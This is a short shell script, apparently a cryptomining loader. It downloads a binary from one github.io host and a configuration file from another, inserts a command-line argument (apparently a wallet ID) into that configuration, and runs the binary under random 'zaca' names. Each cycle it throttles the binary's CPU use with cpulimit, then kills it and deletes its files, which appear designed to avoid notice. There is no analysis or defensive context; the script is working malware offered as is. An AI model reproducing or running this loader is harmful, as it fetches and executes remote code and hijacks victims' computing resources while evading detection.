wget http://dzmltzack.github.io/web/xm -O oxm
while true
do
rm -f za*
rm -f config*
wget https://pzeankto.github.io/namnam/arqt.json -O config.json
NEW_UUID=$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 8 | head -n 1)
BB=zaca$NEW_UUID
NN=zaca$NEW_UUID
cp oxm $BB
echo $NN >> $BB
sed -i "s/PSPS/$1/g" config.json
chmod +x $BB
./zaca*
result=$(($(grep -c processor /proc/cpuinfo) * 40))
cpulimit -b -l $result -p $(pgrep zaca)
sleep 220
kill -9 $(pgrep cpul)
kill -9 $(pgrep zaca)
rm -f za*
rm -f config*
sleep 60
done
